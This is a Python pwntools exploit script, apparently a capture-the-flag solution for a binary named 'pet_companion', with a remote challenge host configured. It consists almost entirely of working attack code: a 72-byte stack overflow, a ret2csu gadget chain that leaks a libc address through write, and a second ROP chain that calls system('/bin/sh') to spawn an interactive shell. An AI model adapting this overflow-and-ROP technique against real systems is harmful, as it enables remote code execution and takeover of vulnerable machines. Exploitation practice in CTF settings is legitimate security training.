#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pet_companion'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '94.237.50.202', 55784

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *__libc_csu_init+64
break *__libc_csu_init+90
break *main
break *0x4006be
break *main+121
'''.format(**locals())

def csuPayload(rdi, rsi, rdx):
    csuPayload0 = 0x40073a # popper gadget
    csuPayload1 = 0x400720 # mov gadget
    initPtr = 0x600de8

    # r15 -> rdx
    # r14 -> rsi
    # r13d -> edi
    # calls [r12 + rbx*8], r12 needs to be a valid pointer to an addr, i use _init
    # payload += csuPayload(0xabd1, 0x4567, 0x89abc, 0xdef)

    payload = flat(
        csuPayload0,
        0x0,
        0x1,
        initPtr,
        rdi,
        rsi,
        rdx,
        csuPayload1,
        pack(0) * 7,
    )

    return payload

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    write_got = 0x600fd8
    write_plt = 0x4004f0

    offset = 72
    payload = b'A' * offset
    payload += csuPayload(1, write_got, 10) # <-- Setting the registers to match write arguments
    payload += p64(write_plt) # <-- Calls write
    payload += p64(elf.sym['main']) # <-- Back to main
    io.sendlineafter(b':', payload)

    io.recvuntil(b'Configuring...')
    io.recvlines(2)
    leak = unpack(io.recvn(6).ljust(8, b'\x00'))

    libc.address = leak - libc.sym['write']

    payload = flat({
        offset: [
            rop.rdi.address,
            next(libc.search(b'/bin/sh')),
            libc.sym['system']
        ]
    })

    io.sendline(payload)

    log.info('Libc base: %#x', libc.address)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()
